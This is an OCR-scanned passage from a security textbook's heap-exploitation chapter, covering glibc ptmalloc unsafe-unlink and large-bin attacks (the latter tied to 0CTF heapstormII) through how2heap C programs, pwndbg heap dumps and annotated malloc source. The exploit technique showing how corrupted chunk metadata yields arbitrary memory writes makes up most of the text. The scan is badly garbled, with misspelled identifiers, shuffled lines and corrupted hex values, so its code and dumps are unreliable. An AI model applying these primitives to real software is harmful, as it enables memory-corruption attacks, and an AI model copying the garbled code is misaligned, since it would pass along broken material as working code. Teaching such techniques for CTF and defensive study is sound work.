fprintf (stderr, *Fake chunk fd: p\n", (void*) chunko_ptr [2]) ;
fprintf (stderr, *Fake chunk bk: 4p^\n\n*, (void+) chunko_ptx[3] ) ;
fprintf (stderr, *We assume that ve have an overflow in chunk0 so that we
can freely
uint64_t *chunk1_hdr = chunk1_ptr - header_aize;
change chunk1 metadata . (n*) ;
fprintf (stderr, *He shrink the size of chunko (saved as
previous_size' in chunk1) so
that free wi1l think that chunk0 starts vhere we placed our fake
chunk. (n") ;
fprintf (stderr, *It*s important that our fake chunk begins exactly
where the known
pointer point.s and that we shrink the chunk accordingly
\n") ;
chunk1_hdz [0] = ma11oc_s1ze;
previous_size vould have
fprintf (stderr, *If we had 'nozmally' freed chunko, chunk1.
been 0x90, however this is its new value: $p^n*, (void*)
chunk1_hdx [0] ] ;
fprintf (stderr, *te mazk our fake chunk as free by setting
previous_in_use′ of chunk1
as False \,n’n*) ;
chunk1_hdx [1] &= ~1;
fprintf (stderr, *Nov ve free chunk1 so that consolidate backward vi11
unlink our fake
chunk, overwziting chunko_ptr. \n*) ;
fprintf (stderr, *You can find the source of the unlink macro at
https://sourceware .org/git/?p=glibc git;a=b1ob; f=mal1oc/
ma1loc.c;
hb=07c18a008c2ed8f5660adba2b778671
h=ef04360b918bceca424482c6db03cc5ec90c3e00;
free (chunk1_ptx) ;
db159a141#11344\n\,n*) ;
itself to point to
fprintf (stderr, *At this point we can use chunko_ptr to overwrite
char victim_string [8] :
an arbitrary location. \n*) ;
strcpy (victim_string, "Hello!~") ;
chunko_ptz[3] - (uint64_t) victin_string;
fprintf (stderr, *chunko_ptr is nowpointing where we want, we use it to
overwrite our
---
## Page 490
6.6Heap
477
fprintf (stderr, *original value: ta^n", victim_string) :
victim string - \n*} ;
chunk0_ptx [0] = 0x41414142424242LL;
fprintf (stderr, *New Value: $s\n", victim_string) ;
Debug this sample with GDB and set the breakpoint on line 46.
Note : breakpoint 2 also set at pc 0x4009b9.
pwndbg> b 46
Breakpoint 1 at 0x4009b9 : file glibc_2.25/unsafe_unlink.c, 1ine 46 .
The heap layout of the program at this point is as follows.
0x603000 :
0×0000000000000000
0×0000000000000091
0x603010 :
0×0000000000000000
0×0000000000000000
0x6 03020 :
0×00０000000060２058
0x0０００００００００6０２0６０
0x6 03030 :
0×0000000000000000
0×0000000000000000
0x6 0304 0 :
0×0000000000000000
0×0000000000000000
0x6 03050 :
0×0００００００００0000000
0×0000000000000000
0x6 03060 :
0000000000000000xo
0×0000000000000000
0x0000000000000000
0×0000000000000000
0x603070 :
0x603080 :
0×0000000000000000
0x603090 :
0x6030a0 :
0000000000000000xo
0800000000000000x0
0×0000000000000090
0x6030b0 :
0x6030c0 :
0×0００0００0００0000000
0×0０00０00０00000000
0×0000000000000000
0×0000000000000000
0x6 030d0 :
0×0000000000000000
0×0000000000000000
0x6 03 0e0 :
0×0000000000000000
0×0000000000000000
0x6030f 0 :
0000000000000000xo
0×0000000000000000
0000000000000000xO
０x００００００００００0０００0０
0x603100 :
0x603110 :
0x0000000000000000
0×0000000000000000
T000200000000000x0
０x００００００００００000000
0x603120 :
The Ox603090 is a chunk to be released, and its header information shows that the
previous chunk was in a freed state with size Ox80.
4 001
if (!prev_inuse (p)) (
4 003
200
prevsize = p->prev_size;
size += prevsize;
4 004
4005
p = chunk_at_offset (p, - ( (1ong) prevsize)) ;
unlink (av, p, bek, fwd) ;
4 006
}
When the chunk 0x603090 is freed, ptmalloc will check that the prev_inuse bit of
the chunk is O, then unlink the previous chunk from the list and merge it into one
chunk. p points to the chunk at 0x603010, which is &chunk0_ptr, so p’s fd points to
“((19u)gozis)-ndoxumpx)8s009x0
---
## Page 491
478
6PWN
pwndibg> ×/20gx 0x602058
0x602058 :
0×0000000000000000
0ox00o07ffff7dd2540
0x602068:0x00000000000000000x0000000000603010
bk points to 0x602060(&chunk0_ptr-(sizeof(uint64_t)*2).
pwndibg> ×/20gx 0x602060
Dx602060 :0x00007ffff7dd25400x0000000000000000
0x602070 :0x0000000000603010 0x0000000000000000
When memory is set up according to this layout, the first check of unlink is
bypassed.
FD->bk ! = P 1| BK->fd ! = P
Then point to the remove operation.
FD- >bk = BK;
BK->fd = FD;
+ (0×x602060+0x10) = 0x602058
* (0×x602058+ 0×x18) = 0x602060
Looking at the chunk0_ptr's information at this point, you can see that its value is
rewritten to 0x602058, which is the 0x18 offset of the address where the chunk0_ptr
is stored.
$8 = (uint64_t **) 0x602070 
pwndbg> print &chunk0_ptr
pwndbg> print chunko_ptr
$9 = (uint64_t *) 0x602058
chunk0_ptz[3] = (uint64_t) victim_string;
The pointer to chunko_ptr is directly overwritten with the address of victim_string.
At this point, chunk0_ptr points to the following information.
S10 = (uint64_t *) 0x7fffffffe410
pwndbg> print chunk0_ptr
In this way, we have completed the Unlink attack.
As you can see from Unlink's code, When Unlink will process Large Bin:
bui1tin_expect (P- >fd_nextsize->bk_nextsize != P, 0)
_builtin_expect (P->bk_nextsize->fd_nextsize != P, 0)
---
## Page 492
6.6 Heap
6
the two will checks fail, and trigger the
malloc_printerr (check_action, *corrupted double-1inked list (not
sma11)", P, AV) ;
Then continue with the following operation. Observe the code for malloc_printerr.
static void malloc_printerr (int action, const char *str, void *ptr,
mstate ar_ptr) {
/+ Avoid using this arena in future. We do not attempt to synchronize
this vith
gets ita
anything else because we minimally want to ensure that libc_nessage
resources safely without stumbling on the current corruption. */
if (ar_ptr)
set_arena_corrupt (az_ptx) ;
if ((action & 5) == 5)
else if (action &1) {
_1ibc_message (action & 2, *$sn*, stz) ;
char buf [2 * sizeof (uintptr_t) + 1] :
char *cp =_itoa_vord ((uintptr_t) ptr, &buf [sizeof (buf) - 1] , 16, 0) ;
buf [slzeof (buf) - 1] = '\o';
wh1le (cp > buf)
*--cp =*0′;
_libc_message (action & 2, ***+ grror in *$s' : vs: 0xts **+\n*,
_1ibc_argv[o] ? : "", str, cp) ;
else if (action & 2)
abort ();
void__libc_message (enum __libc_message_action, const char *fnt., -.- )
if ((action & do_abort)) {
1f ( (action & do_backtrace))
// xi11 the application.
BEFORE_ABoRT (do_abort, written, fd) ;
abort () ;
As long as action&2 I  1, the process will not kill by abort. And if (action & 5)
 5) is satisfied, then malloc_printerr will print an error message to get the address
information and the program will be terminated due to abort.
The unlink operation of the large bin can be used to get a chance to write to an
arbitrary address without terminating the program with malloc_printerr. You can
experiment with the source yourselves.
---
## Page 493
480
6PWN
6.6.3.5  Large Bin Attack (0CTF heapstormII)
When processing Large Bin, the heap manager uses fd_nextsize and bk_nextsize to
sort the list by the size of each Large Bin. We can bypass the legality check and write
following describes how to exploit it by using the large_bin_attack of the how2heap
heap addresses to any address when the ptmalloc processing the list. Again, the
project.
#include
#include
int main () {
large unaigned
fprintf (stderr, *This file denonstrates large bin attack by vriting a
1ong value into stack\n") ;
fprintf (stderr, "In practice, large bin attack is generally prepared
for further attacks,
such as revriting the global variable global_max_fast in 1ibc for
further fastbin attack?n\n*) ;
unsigned 1ong stack_var1 = 0;
unsigned 1ong stack_var2 = 0 ;
fprintf (stderr, *Let*s first look at the targets we want to rewzite on
stack:\n") ;
fprintf (stderr, *stack_varl (&p) : $ld\n", &stack_varl, stack_var1) ;
fprintf (stderr, *stack_var2 (%p) : $ld\n\n", &stack_var2,
stack_var2) ;
unsigned 1ong *p1 = ma11oc (0x320) ;
fprintf (stderr, *Now, we al1ocate the first large chunk on the heap at : $
p\n", p1 - 2) ;
fprintf (stderr, *And allocate another fastbin chunk in order to avoid
consolidating
the next large chunk with the first lazge chunk during the free () \n
\n");
malloc(0x20) ;
unsigned 1ong *p2 = mal1oc (0x4 00) ;
fprintf (stderr, *Then, we allocate the second large chunk on the
heap at: $p^n", p2 - 2) ;
consolidating
fprintf (atderr, *And allocate another fastbin chunk in order to avoid
the next large chunk vith the second large chunk during the free () ,n
\n") ;
mal1oc(0x20) :
---
## Page 494
6.6 Heap
481
fprintf (stderr, *Finally, ve allocate the third large chunk on the
 (0oxo) ootteu = ed 6uot paubsun
heap at : $p^n", p3 - 2) ;
consolidating
fprintf (stderr, *And allocate another fastbin chunk in order to avoid
the top chunk vith the third large chunk during the free () \n^n*) ;
ma11oc (0x20) ;
free (p1) ;
fprintf (stderr, *He free the first and second large chunks now and they
free (p2) ;
wi11 be inserted
in the unsorted bin: [ tp  $p 1 \n\n", (void +) (p2 - 2) 。 (void ▪)
(p2 [0])) ;
fprintf (stderr, *Nov, we allocate a chunk with a size smaller than the
ma11oc (0x90) ;
freed first
large bin
1arge chunk. This vill move the freed second large chunk into the
freelist, use parts of the freed first large chunk for allocation,
and reinsert
the remaining of the freed first large chunk into the unsorted bin: [
$p I\n\n*,
(void +) ( (char *)p1 + 0x90)) ;
fprintf (stderr, *Nou, we free the third lazge chunk and it wi1l be
free (p3);
inserted in the
unsorted bin: [ p  $p 1 \n),n^n*, (void *) (p3 - 2) 。 (void *) (p3 [0] ) ) ;
/ / ---
-- - VULNERABILITY -**
fprintf (stderr, *Now emulating a vulnerability that can overwrite the
freed second
1arge chunk′s \*size\*** as well as its \*bk\" and \*bk_nextsize′\*
pointers\n");
fprintf (stderr, *Basically, ve decrease the size of the freed second
large chunk to
force malloc to insert the freed third large chunk at the head of the
large bin
16 bytee before
freelist. To overvrite the stack variables, ve set ^*bk'\* to
stack_var1 and \*bk_nextsize>* to 32 bytes before stack_var2 \n
\n") ;
x = [1-]d
p2 [0] = 0;
p2 [2] = 0;
p2 [1] = (unsigned long) (&stack_var1 - 2) ;
p2 [3] = (unsigned long) (&stack_var2 - 4) ;
---
## Page 495
482
6PWN
ma11oc(0x90) ;
fprintf (stderr, *Let's malloc again, so the freed third large chunk
being inserted into the
large bin freelist . During this time, targets should have already been
rewritten:\n") ;
fprintf (stderr, *atack_var1 ($p) : $p^n", &stack_var1, (void *)
stack_var1) ;
fprintf (stderr, *stack_var2 ($p) : $p\n#, &stack_var2, (void *)
stack_var2) ;
return 0;
上
Debug this program using GDB and set the breakpoint on line 81. At this point
the program’s heap layout is as follows.
a11 : 0x6037a0 → 0x6030a0 → 0x7ftff7dd1b78 (main_arena+88) + 0x6037a0
unsortedbin
0x400: 0x603360 → 0x7ffff7dd1f68 (main_arena+1096) + 0x603360 /+
largebins
/+E、
At this point there are two Unsorted Bin and one Large Bin. Large Bin is
generated by placing a Large Bin sized Bin from the Unsorted Bin into the Large
Bin list at line 74 malloc(90). The sinformation of this Large Bin is as follows.
0x603360 :
0000000000000000XO
TT0000000000000X0
0x603370 :
ox00007ffff7dd1f68
0x00007ffff7dd1f68
0x603380: 0x0000000000603360 0x×0000000000603360
Since there is currently only one Large Bin, both fd_nextsize and bk_nextsize
point to itself.
The following code modified the structure information of the Large Bin.
p2 [-1] = 0x3f1;
p2 [0] = 0;
p2 [1] = (unsigned 1ong) (&stack_var] - 2) ;
p2 [2] = 0;
p2 [3] = (unsigned 1ong) (&stack_var2 - 4) ;
---
## Page 496
6.6Heap
483
Let’s see the structure information at this point:
0x603360:0x00000000000000000x00000000000003f1
: 0LEE0 9×0
0×0000000000000000
ox00oo7fffffffe3e0
0x603380 :
0×0000000000000000
0x0ooo7fffffffe3d8
Now we set a breakpoint at the _int_malloc function and then enter the function.
Since the requested memory size is 0x90, the two chunks in Unsorted Bin are 0x410
and Ox290. Therefore, the two chunks in Unsorted Bin will be put into the lists with
their respective sizes. 0x290 will be put into Small Bin and 0x410 will be put into
Large Bin.
Here is the logic for handling Large Bin.
if (in_smallbin_range (size))
else {
// Get the list of this size.
// Enter this branch.
victim_index = largebin_index (size) ;
bck = bin_at (av, victim_index) ;
 // maintain large bins in sorted order
fwd = bck->fd;
// The list is not empty, since a large bin of size 0x41o has been freed
previously.
if (fwd ! = bck) {
// Or with inuse bit to speed conparisons
// if sma1ler than smallest, bypass loop below
size |= PREV_INUSE;
assert (chunk_main_arena (bck->bk) );
if ( (unsigned long) (size)  0x3f0 so the condition is not satisfied.
(bck- >bk) ){
fwd = bck;
bck = bck- >bk;
victim->fd_nextsize = fwd->fd;
fwd->fd->bk_nextsize = victim->bk_nexteize->fd_nextsize =
victim->bk_next.size = fwd- >fd->bk_nextsize;
victim;
else 
assert (chunk_main_arena (fwd));
while ((unsigned long) size fd_nextsize;
assert (chunk_main_arena (fvd) ) ;
1f ( (unsigned long) size == {unsigned long) chunksize_nomask
(fwd) )
fwd = fwd- >fd;
// Always insert in the second position